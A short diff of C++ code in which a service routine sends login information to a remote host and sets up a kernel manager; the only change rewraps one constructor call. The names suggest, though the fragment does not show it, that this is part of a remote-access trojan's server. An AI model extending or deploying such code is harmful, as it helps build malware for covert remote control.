@@ -122,7 +122,8 @@ UINT WINAPI ServerMain(char *lpServiceName)
 		// 登录
 		//DWORD dwExitCode = SOCKET_ERROR;
 		sendLoginInfo(szServiceName, &socketClient, GetTickCount64() - dwTickCount);
-		CKernelManager	manager(&socketClient, szServiceName, g_dwServiceType, szKillEvent, lpszHost, nPort);
+		CKernelManager	manager(&socketClient, szServiceName, g_dwServiceType, 
+								szKillEvent, lpszHost, nPort);
 		socketClient.setManagerCallBack(&manager);
 
 		//////////////////////////////////////////////////////////////////////////
